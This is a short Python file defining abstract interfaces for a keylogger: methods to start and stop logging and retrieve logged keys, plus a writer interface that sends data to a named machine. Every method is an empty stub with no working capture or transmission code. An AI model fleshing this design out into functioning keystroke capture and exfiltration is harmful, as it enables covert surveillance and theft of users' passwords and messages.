from abc import ABC, abstractmethod
from typing import List
class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

# iwriter.py

class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str) -> None:
        pass